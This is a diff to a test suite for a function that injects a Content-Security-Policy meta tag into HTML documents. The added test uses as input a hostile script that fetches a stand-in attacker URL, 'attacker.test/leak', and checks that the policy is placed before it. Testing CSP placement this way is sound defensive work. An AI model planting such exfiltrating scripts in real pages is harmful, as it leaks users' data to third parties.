@@ -269,11 +269,22 @@ describe('policy injection', () => {
     expect(injected.indexOf('Content-Security-Policy')).toBeLessThan(injected.indexOf('<title>'));
   });
 
+  it('moves a late head ahead of hostile executable markup before installing CSP', () => {
+    const injected = withCspMeta(
+      '<html><script>fetch("https://attacker.test/leak")</script><head><title>x</title></head><body>safe</body></html>',
+      `default-src 'none'; connect-src 'none'`,
+    );
+
+    expect(injected.indexOf('Content-Security-Policy')).toBeLessThan(injected.indexOf('<script>'));
+    expect(injected).toContain('<script>fetch("https://attacker.test/leak")</script>');
+    expect(injected).toContain('<title>x</title>');
+  });
+
   it('synthesizes a head for a document that has none', () => {
     expect(withCspMeta('<html><body>x</body></html>', 'p')).toContain(
       '<html><head><meta http-equiv="Content-Security-Policy" content="p"></head><body>',
     );
-    expect(withCspMeta('<body>x</body>', 'p')).toMatch(/^<head><meta/);
+    expect(withCspMeta('<body>x</body>', 'p')).toMatch(/^<html><head><meta/);
   });
 
   it('escapes quotes so a policy value cannot break out of the attribute', () => {
